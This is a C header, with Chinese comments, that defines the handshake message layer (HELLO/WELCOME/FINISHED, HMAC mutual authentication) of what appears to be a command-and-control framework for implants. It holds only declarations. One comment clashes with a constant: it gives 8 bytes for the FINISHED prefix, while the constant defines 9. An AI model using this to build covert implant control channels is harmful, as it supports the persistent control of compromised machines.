/*
 * DAYANJING v3 — c2_hsmsg.h
 *
 * C2 握手报文层（HELLO / WELCOME / FINISHED）的编码与解码。
 *
 * 存在理由：
 *   02_c2 原本只有握手状态机与 transcript，没有报文编解码器——
 *   所谓"握手"只能两端各自本地喂相同字节，不是线上协商。
 *   本文件补齐报文层，使 nonce / server_static_id / generation
 *   真正经网络交换，并由 PSK 派生的 k_identity 做双向 MAC 认证。
 *
 * 报文类型（与 13_c2_server/protocol/messages.py 对齐）：
 *   MSG_HELLO    = 0x01  客户端 -> 服务端
 *   MSG_WELCOME  = 0x02  服务端 -> 客户端
 *   MSG_FINISHED = 0x03  客户端 -> 服务端
 *
 * 报文体（小端定长域，**首字节为类型**，禁止长度前缀歧义）：
 *
 *   HELLO:    type(0x01) || version(u32) || suite(u32) || id_len(u8) || implant_id || cnonce(32)
 *   WELCOME:  type(0x02) || version(u32) || suite(u32) || snonce(32) || server_static_id(16)
 *             || generation(u64 BE) || server_mac(32)
 *   FINISHED: type(0x03) || version(u32) || suite(u32) || client_mac(32)
 *
 * MAC 构造（双向认证，防降级/篡改；类型字节纳入覆盖范围）：
 *   server_mac = HMAC(k_identity, "dayanjing-hs-server" || HELLO || WELCOME_prefix)
 *   client_mac = HMAC(k_identity, "dayanjing-hs-client" || HELLO || WELCOME || FINISHED_prefix)
 *   其中 *_prefix 指该报文去掉 MAC 字段、但**包含类型字节**的前缀。
 *
 * transcript（与 c2.h 注释一致）：
 *   SHA256(HELLO || WELCOME || FINISHED_prefix)
 *   注意 FINISHED 进 transcript 的是前缀（version+suite），不含 client_mac，
 *   避免"MAC 覆盖自身"的循环依赖。
 *
 * 安全约束：
 *   - WELCOME 的 server_mac 由客户端校验：伪造服务端（无 PSK）无法通过
 *   - FINISHED 的 client_mac 由服务端校验：伪造客户端无法通过
 *   - 校验失败一律返回 C2_ERR_AUTH，不推进状态机、不输出密钥
 */

#ifndef DAYANJING_C2_HSMSG_H
#define DAYANJING_C2_HSMSG_H

#include <stddef.h>
#include <stdint.h>
#include "c2.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 报文类型 ---- */
#define C2_HSMSG_HELLO    0x01
#define C2_HSMSG_WELCOME  0x02
#define C2_HSMSG_FINISHED 0x03

/* ---- 常量 ---- */
#define C2_HS_VERSION      1
#define C2_HS_SUITE        1
#define C2_HS_NONCE_LEN   32
#define C2_HS_MAC_LEN     32
#define C2_HS_IMPLANT_MAX  63   /* implant_id 线上最大字节数（不含终止符） */

/* WELCOME 去掉 MAC 后的前缀长度：type(1)+4+4+32+16+8 */
#define C2_HS_WELCOME_PREFIX 65
/* FINISHED 去掉 MAC 后的前缀长度：type(1)+4+4 */
#define C2_HS_FINISHED_PREFIX 9

/* ====================================================================
 * HELLO
 * ==================================================================== */

/*
 * 编码 HELLO。out 可为 NULL（仅探测长度，写入 *len）。
 * implant_id 可为 NULL（视作空 ID）。
 */
int c2_hsmsg_encode_hello(uint8_t *out, size_t cap, size_t *len,
                          uint32_t version, uint32_t suite,
                          const char *implant_id,
                          const uint8_t cnonce[C2_HS_NONCE_LEN]);

/*
 * 解码 HELLO。implant_id 可为 NULL/id_cap=0（不取 ID）。
 * 长度不符、id_len 越界一律 C2_ERR_LEN。
 */
int c2_hsmsg_decode_hello(const uint8_t *in, size_t len,
                          uint32_t *version, uint32_t *suite,
                          char *implant_id, size_t id_cap,
                          uint8_t cnonce[C2_HS_NONCE_LEN]);

/* ====================================================================
 * WELCOME（含服务端 MAC 认证）
 * ==================================================================== */

/*
 * 编码 WELCOME。k_identity 为注册派生出的长期密钥（16 字节）。
 * hello/hello_len 为收到的 HELLO 原始字节，参与 MAC 计算。
 */
int c2_hsmsg_encode_welcome(uint8_t *out, size_t cap, size_t *len,
                            uint32_t version, uint32_t suite,
                            const uint8_t snonce[C2_HS_NONCE_LEN],
                            const uint8_t server_static_id[C2_SERVER_ID_LEN],
                            uint64_t generation,
                            const uint8_t k_identity[C2_KEY_LEN],
                            const uint8_t *hello, size_t hello_len);

/*
 * 解码并校验 WELCOME 的 server_mac。
 * 校验失败返回 C2_ERR_AUTH，不输出任何字段。
 */
int c2_hsmsg_decode_welcome(const uint8_t *in, size_t len,
                            uint32_t *version, uint32_t *suite,
                            uint8_t snonce[C2_HS_NONCE_LEN],
                            uint8_t server_static_id[C2_SERVER_ID_LEN],
                            uint64_t *generation,
                            const uint8_t k_identity[C2_KEY_LEN],
                            const uint8_t *hello, size_t hello_len);

/* ====================================================================
 * FINISHED（含客户端 MAC 认证）
 * ==================================================================== */

int c2_hsmsg_encode_finished(uint8_t *out, size_t cap, size_t *len,
                             uint32_t version, uint32_t suite,
                             const uint8_t k_identity[C2_KEY_LEN],
                             const uint8_t *hello, size_t hello_len,
                             const uint8_t *welcome, size_t welcome_len);

int c2_hsmsg_decode_finished(const uint8_t *in, size_t len,
                             uint32_t *version, uint32_t *suite,
                             const uint8_t k_identity[C2_KEY_LEN],
                             const uint8_t *hello, size_t hello_len,
                             const uint8_t *welcome, size_t welcome_len);

/* ====================================================================
 * transcript 便捷计算
 * ==================================================================== */

/*
 * out = SHA256(hello || welcome || fin_prefix)
 * 任何一段可为 NULL（len=0）。fin_prefix 传 FINISHED 的前 8 字节（不含 MAC）。
 */
void c2_hsmsg_transcript(const uint8_t *hello, size_t hello_len,
                         const uint8_t *welcome, size_t welcome_len,
                         const uint8_t *fin_prefix, size_t fin_len,
                         uint8_t out[C2_TRANSCRIPT_LEN]);

/* 取报文首字节的类型，长度不足返回 -1 */
int c2_hsmsg_type(const uint8_t *in, size_t len);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_C2_HSMSG_H */
